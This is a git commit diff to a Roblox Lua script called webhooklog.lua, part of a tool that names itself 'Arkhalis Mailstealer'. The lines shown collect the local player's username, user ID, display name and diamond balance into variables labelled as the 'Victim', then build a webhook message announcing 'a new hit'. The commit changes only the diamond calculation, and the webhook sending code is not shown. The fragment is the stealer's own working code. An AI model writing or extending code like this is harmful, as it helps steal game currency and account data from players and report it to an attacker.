c71ef902ebbf0a96e6af6908b46bf18e94352b7a
Arkhalislua <130490495+Arkhalislua@users.noreply.github.com>
2023-04-30 23:20:22 +0200

    Update webhooklog.lua

--- webhooklog.lua
+++ webhooklog.lua
@@ -18,7 +18,7 @@ _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Ran
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
 _G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
-_G.Diamonds = player.leaderstats.Diamonds.Value - 80000000
+_G.Diamonds = player.leaderstats.Diamonds.Value
 local function sendwebhook(msg)
 local msg = {
   ["content"]= "**Arkhalis Mailstealer has detected a new hit!**",
